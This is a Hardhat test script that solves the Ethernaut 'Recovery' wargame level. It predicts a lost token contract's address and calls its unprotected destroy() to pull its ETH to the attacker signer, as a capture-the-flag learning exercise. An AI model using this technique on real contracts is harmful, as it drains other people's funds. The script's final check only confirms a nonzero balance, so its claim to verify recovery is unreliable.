import { ethers } from "hardhat";
import { expect } from "chai";

describe("Ethernaut 17 - Recovery", function () {
  it("Should recover ETH from the destroyed SimpleToken", async function () {
    const [attacker] = await ethers.getSigners();

    // 1. Deploy Recovery contract
    const RecoveryFactory = await ethers.getContractFactory("Recovery");
    const recovery = await RecoveryFactory.connect(attacker).deploy();
    await recovery.waitForDeployment();

    // 2. Generate token with 1 ether
    const tx = await recovery.connect(attacker).generateToken("Token", 100);
    const receipt = await tx.wait();

    // 3. Compute SimpleToken address
    // Get the address of the Recovery contract
    const recoveryAddress = await recovery.getAddress();

    // Predict SimpleToken address (first child contract of Recovery)
    const tokenAddress = ethers.getCreateAddress({
        from: recoveryAddress,
        nonce: 1n // BigInt required for ethers v6
    });

      
    const tokenBalance = await ethers.provider.getBalance(tokenAddress);

    // 4. Call destroy() manually to recover funds
    const simpleTokenAbi = ["function destroy(address payable _to) public"];
    const token = new ethers.Contract(tokenAddress, simpleTokenAbi, attacker);

    const recipient = await attacker.getAddress();
    await token.destroy(recipient);

    // 5. Check recipient balance increased
    const finalBalance = await ethers.provider.getBalance(recipient);

    // Just confirm it ran successfully
    expect(finalBalance).to.be.gt(0n);
  });
});
